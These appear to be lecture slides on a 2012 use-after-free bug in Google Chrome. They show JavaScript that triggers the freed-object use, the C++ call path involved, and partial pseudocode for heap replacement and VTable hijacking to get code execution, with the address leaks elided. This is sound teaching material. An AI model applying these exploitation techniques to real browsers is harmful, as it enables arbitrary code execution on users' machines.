\usetikzlibrary{calc,fit,matrix}
\begin{frame}{real UAF exploitable bug}
    \begin{itemize}
        \item 2012 bug in Google Chrome
        \item exploitable via JavaScript
        \item discovered/proof of concept by PinkiePie
        \item allowed arbitrary code execution via VTable manipulation
    \end{itemize}
\end{frame}


\begin{frame}[fragile,label=UAFTriggering]{UAF triggering code}
\lstset{
    language=JavaScript,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
}
\begin{tikzpicture}
\node[anchor=north east] (code) at (0, 0) {
\begin{lstlisting}
// in HTML near this JavaScript:
// <video id="vid"> (video player element)
function source_opened() {
  buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
  ~2~vid.parentNode.removeChild(vid);~end~
  gc(); // force garbage collector to run now
  // garbage collector frees unreachable objects
  // (would be run automatically, eventually, too)
  // buffer now internally refers to delete'd player object
  ~3~buffer.timestampOffset = 42;~end~
}
ms = new WebKitMediaSource();
ms.addEventListener('webkitsourceopen', source_opened);
vid.src = window.URL.createObjectURL(ms);
\end{lstlisting}
};
    \begin{visibleenv}<4->
        \node[fill=white,opacity=0.6,fit=(code)] {};
        \node[draw=red,ultra thick,anchor=north east,fill=white,overlay] (cppCode) at (-.25, .125) { 
\lstset{
    language=C++,
    style=smaller,
    moredelim={**[is][\btHL<2|handout:0>]{~2~}{~end~}},
    moredelim={**[is][\btHL<3-4|handout:0>]{~3~}{~end~}},
    moredelim={**[is][\btHL<4|handout:0>]{~4~}{~end~}},
    moredelim={**[is][\btHL<5|handout:0>]{~5~}{~end~}},
}
\begin{lstlisting}
// implements JavaScript buffer.timestampOffset = 42
void SourceBuffer::setTimestampOffset(...) {
     if (m_source->setTimestampOffset(...))
        ...
}
bool MediaSource::setTimestampOffset(...) {
    // m_player was deleted when video player element deleted
    // but this call does *not* use a VTable
    if (!~4~m_player~end~->sourceSetTimestampOffset(id, offset)) 
        ...
}
bool MediaPlayer::sourceSetTimestampOffset(...) {
    // m_private deleted when MediaPlayer deleted
    // this *is* a VTable-based call
    return ~5~m_private~end~->sourceSetTimestampOffset(id, offset);
}
\end{lstlisting}
    };
    \end{visibleenv}
\end{tikzpicture}
\imagecredit{via \url{https://bugs.chromium.org/p/chromium/issues/detail?id=162835}}
\end{frame}

\begin{frame}[fragile,label=theExploit]{UAF exploit (approx. pseudocode)}
\begin{lstlisting}[language=JavaScript,style=smaller]
... /* use information leaks to find relevant addresses */ 
buffer = ms.addSourceBuffer('video/webm; codecs="vorbis,vp8"');
vid.parentNode.removeChild(vid);
vid = null;
gc();
// allocate object to replace m_private
var array = new Uint32Array(168/4);
// allocate object to replace m_player
// type chosen to keep m_private pointer unchanged
rtc = new webkitRTCPeerConnection({'iceServers': []});
array[0] = ... /* fill in array with chosen values */
// trigger VTable Call that uses chosen address
buffer.timestampOffset = 42;
\end{lstlisting}
\end{frame}

\begin{frame}{type confusion}
    \begin{tikzpicture}
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt MediaPlayer} (deleted but used)}] (PlayerVT) at (0, 0) {
        m\_private {\normalfont (pointer to PlayerImpl)} \\
        m\_timestampOffset {\normalfont (double)} \\
    };
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt webkitRTC\ldots} (replacement)}] (SomethingVT) at (8, 0) {
        (something not changed) \\
        m\_??? {\normalfont (pointer)} \\
        \ldots \\
    };
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt PlayerImpl} (deleted but used)}] (PlayerImplVT) at (0, -2) {
        VTable pointer \\
        \ldots \\
    };
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:array of 32-bit ints (replacement)}] (ArrayVT) at (8, -2) {
        array[0], array[1] \\
        array[2], array[3] \\
        \ldots \\
    };
    \end{tikzpicture}
\end{frame}

\begin{frame}{missing pieces: information disclosure}
    \begin{itemize}
        \item need to learn address to set VTable pointer to
            \begin{itemize}
            \item (and other addresses to use)
            \end{itemize}
        \item allocate types other than \texttt{Uint32Array}
        \item rely on confusing between different types, e.g.
    \end{itemize}
    \begin{tikzpicture}
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt MediaPlayer} (deleted but used)}] (PlayerVT) at (0, 0) {
        m\_private {\normalfont (pointer to PlayerImpl)} \\
        m\_timestampOffset {\normalfont (double)} \\
    };
    \matrix[tight matrix,nodes={text width=6.8cm,text depth=.1ex,font=\small\tt},anchor=north west,
            label={north:{\tt Something} (replacement)}] (SomethingVT) at (8, 0) {
        \ldots \\
        m\_buffer {\normalfont (pointer)} \\
    };
    \end{tikzpicture}
    \begin{itemize}
    \item allows reading timestamp value to get a pointer's address
    \end{itemize}
\end{frame}
